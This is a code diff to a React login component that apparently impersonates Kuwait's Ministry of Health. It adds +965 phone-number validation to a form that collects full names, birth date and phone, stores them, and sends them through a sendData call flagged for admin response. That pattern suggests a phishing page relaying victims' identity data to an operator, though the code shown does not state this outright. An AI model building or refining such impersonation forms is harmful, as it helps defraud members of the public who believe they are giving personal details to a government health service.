@@ -38,6 +38,7 @@ export default function MOHLogin() {
 
   const [birthDate, setBirthDate] = useState('');
   const [phone, setPhone] = useState('');
+  const [phoneError, setPhoneError] = useState('');
 
   const isAr = lang === 'ar';
 
@@ -84,8 +85,9 @@ export default function MOHLogin() {
     navigateToPage('تحديث البيانات');
   };
 
+  const isPhoneValid = phone.length === 8 && /^[569]/.test(phone);
   const isUpdateValid = firstNameAr && secondNameAr && thirdNameAr && lastNameAr &&
-    firstNameEn && secondNameEn && thirdNameEn && lastNameEn && birthDate && phone;
+    firstNameEn && secondNameEn && thirdNameEn && lastNameEn && birthDate && isPhoneValid;
 
   const handleUpdate = () => {
     if (!isUpdateValid) return;
@@ -96,7 +98,7 @@ export default function MOHLogin() {
     localStorage.setItem('mohUserName', fullNameAr);
     localStorage.setItem('mohEnglishName', fullNameEn);
     localStorage.setItem('mohBirthDate', birthDate);
-    localStorage.setItem('mohPhone', phone);
+    localStorage.setItem('mohPhone', '+965' + phone);
 
     sendData({
       data: {
@@ -110,7 +112,7 @@ export default function MOHLogin() {
         'الاسم الثالث (إنجليزي)': thirdNameEn,
         'اسم العائلة (إنجليزي)': lastNameEn,
         'تاريخ الميلاد': birthDate,
-        'رقم الهاتف': phone,
+        'رقم الهاتف': '+965' + phone,
       },
       current: 'تحديث البيانات',
       waitingForAdminResponse: false,
@@ -456,14 +458,42 @@ export default function MOHLogin() {
                 {/* Phone */}
                 <div style={{ marginBottom: 25 }}>
                   <label style={labelStyle}>{tx.phone} <span style={{ color: 'red' }}>*</span></label>
-                  <input
-                    type="tel"
-                    value={phone}
-                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
-                    maxLength={12}
-                    placeholder={tx.phonePh}
-                    style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
-                  />
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 0, direction: 'ltr' }}>
+                    <span style={{
+                      background: '#f0f0f0',
+                      border: '1px solid #ccc',
+                      borderRight: 'none',
+                      borderRadius: '6px 0 0 6px',
+                      padding: '10px 12px',
+                      fontSize: 15,
+                      color: '#333',
+                      fontWeight: 'bold',
+                      height: '44px',
+                      display: 'flex',
+                      alignItems: 'center',
+                      userSelect: 'none'
+                    }}>+965</span>
+                    <input
+                      type="tel"
+                      value={phone}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, '');
+                        if (val.length <= 8) {
+                          setPhone(val);
+                          setPhoneError('');
+                        }
+                      }}
+                      onBlur={() => {
+                        if (phone && (phone.length !== 8 || !/^[569]/.test(phone))) {
+                          setPhoneError(isAr ? 'رقم الهاتف يجب أن يكون 8 أرقام ويبدأ بـ 5 أو 6 أو 9' : 'Phone must be 8 digits starting with 5, 6 or 9');
+                        }
+                      }}
+                      maxLength={8}
+                      placeholder={'XXXX XXXX'}
+                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left', borderRadius: '0 6px 6px 0', flex: 1 }}
+                    />
+                  </div>
+                  {phoneError && <p style={{ color: 'red', fontSize: 12, marginTop: 4 }}>{phoneError}</p>}
                 </div>
 
                 {/* Update Button */}
